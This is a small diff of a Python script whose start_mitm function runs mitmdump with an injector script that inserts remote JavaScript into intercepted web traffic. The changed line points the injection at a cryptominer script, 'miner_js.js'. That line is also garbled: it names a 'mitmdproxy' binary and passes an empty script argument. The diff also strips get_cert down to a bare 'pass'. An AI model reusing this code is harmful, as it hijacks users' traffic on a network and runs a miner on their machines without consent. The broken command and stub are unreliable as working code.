@@ -6,11 +6,10 @@ import requests
 import os
 
 def start_mitm():
-    os.system("~/.local/bin/mitmdump -s 'injector.py http://192.168.1.32:8000/script.js' -T")
+    os.system("~/.local/bin/mitmdproxy -s '' 'injector.py http://path/to/miner_js.js' -T")
     return True
     
 def get_cert(path, basename):
-    ca_path = os.path.join(path, basename + "-ca.pem")
     pass
 
 def get_stats(secret_key, params={}):
